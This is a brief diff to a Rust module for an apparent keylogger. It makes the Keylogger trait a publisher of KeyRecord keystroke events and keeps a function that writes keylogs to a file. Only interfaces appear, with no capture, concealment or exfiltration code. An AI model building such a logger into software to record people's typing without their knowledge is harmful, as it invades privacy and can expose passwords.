@@ -1,6 +1,8 @@
 use std::fs::OpenOptions;
 use std::io::{BufWriter, Write};
 
+use crate::observers::pub_sub::Publisher;
+
 #[derive(Debug, Clone)]
 pub struct KeyRecord {
     pub key_code: u8,
@@ -10,12 +12,13 @@ pub struct KeyRecord {
     pub modifiers: String,
 }
 
-pub trait Keylogger {
+pub trait Keylogger: Publisher<KeyRecord> {
     // records keystrokes in a different thread
     fn record_keystrokes(&mut self) -> Result<(), &'static str>;
 
     // Stop recording keystrokes and return result
     fn stop(&mut self) -> Result<Vec<KeyRecord>, &'static str>;
+
 }
 
 pub fn write_keylog_to_file(filename: &str, keylog: &Vec<KeyRecord>) -> Result<(), &'static str> {
